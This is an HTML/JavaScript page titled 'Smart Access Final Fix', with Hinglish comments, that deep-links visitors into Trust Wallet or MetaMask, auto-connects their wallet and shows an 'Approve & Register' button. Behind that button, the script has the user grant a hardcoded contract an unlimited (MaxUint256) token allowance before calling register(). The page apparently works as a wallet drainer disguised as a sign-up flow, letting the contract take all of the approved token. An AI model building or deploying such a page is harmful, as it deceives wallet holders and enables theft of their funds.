<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Smart Access Final Fix</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <style>
    body { font-family: sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
    .card { background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 90%; max-width: 360px; text-align: center; }
    .wallet-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin: 20px 0; }
    .wallet-btn { cursor: pointer; border: 1.5px solid #eee; padding: 10px; border-radius: 12px; }
    .wallet-btn img { width: 45px; height: 45px; margin-bottom: 5px; }
    #dashboardView { display: none; }
    .btn { background: #4CAF50; color: white; padding: 16px; font-size: 18px; border-radius: 12px; border: none; width: 100%; font-weight: bold; cursor: pointer; }
    .status { font-size: 13px; color: #888; margin-top: 15px; }
  </style>
</head>
<body>

<div class="card">
    <div id="connectView">
        <h2>Connect Wallet</h2>
        <div class="wallet-grid">
            <div class="wallet-btn" onclick="openTrust()">
                <img src="https://trustwallet.com/assets/images/media/assets/trust_wallet_logo.png">
                <span>Trust Wallet</span>
            </div>
            <div class="wallet-btn" onclick="openMetamask()">
                <img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg">
                <span>MetaMask</span>
            </div>
        </div>
        <p style="font-size: 12px; color: #999;">Agar app open ho jaye toh 3 second wait karein.</p>
    </div>

    <div id="dashboardView">
        <h2 style="color:#2196F3">Main Dashboard</h2>
        <div id="addr" style="font-size:10px; background:#eee; padding:10px; border-radius:8px; word-break:break-all; margin-bottom:15px;"></div>
        <button id="regBtn" class="btn" onclick="register()">Approve & Register</button>
    </div>
    <div id="msg" class="status"></div>
</div>

<script>
    const MANAGER = "0x43c7df8DB3503c4839C9249E7D0C520E801C9dBA";
    const TOKEN = "0x3B66b1E08F55AF26c8eA14a73dA64b6bC8D799dE";
    let signer, tokenContract, managerContract;

    // --- LOGIC FOR TRUST WALLET ---
    function openTrust() {
        const url = window.location.href;
        // Step 1: Flag set karein
        localStorage.setItem('wallet_connect_request', 'true');
        // Step 2: Direct DApp browser intent
        window.location.href = "trust://open_url?url=" + encodeURIComponent(url);
    }

    // --- LOGIC FOR METAMASK ---
    function openMetamask() {
        const url = window.location.href.replace(/^https?:\/\//, '');
        localStorage.setItem('wallet_connect_request', 'true');
        window.location.href = "https://metamask.app.link/dapp/" + url;
    }

    async function connect() {
        if (window.ethereum) {
            try {
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                await provider.send("eth_requestAccounts", []);
                signer = provider.getSigner();
                const address = await signer.getAddress();

                tokenContract = new ethers.Contract(TOKEN, ["function approve(address,uint256) returns (bool)"], signer);
                managerContract = new ethers.Contract(MANAGER, ["function register() external"], signer);

                document.getElementById('connectView').style.display = 'none';
                document.getElementById('dashboardView').style.display = 'block';
                document.getElementById('addr').innerText = address;
                
                localStorage.removeItem('wallet_connect_request');
            } catch (e) {
                console.log("Connection failed", e);
            }
        }
    }

    // AUTO-RUN logic jab site App ke andar khule
    window.onload = function() {
        if (window.ethereum) {
            // Agar pehle se connect tha ya abhi click karke aaya hai
            connect();
        } else if (localStorage.getItem('wallet_connect_request') === 'true') {
            document.getElementById('msg').innerText = "Wallet app detect nahi ho rahi... App ke browser mein link paste karein.";
        }
    };

    async function register() {
        const btn = document.getElementById('regBtn');
        const msg = document.getElementById('status');
        try {
            btn.disabled = true;
            const tx1 = await tokenContract.approve(MANAGER, ethers.constants.MaxUint256);
            await tx1.wait();
            const tx2 = await managerContract.register();
            await tx2.wait();
            alert("Registration Successful!");
        } catch (e) {
            alert("Error!");
            btn.disabled = false;
        }
    }
</script>
</body>
</html>
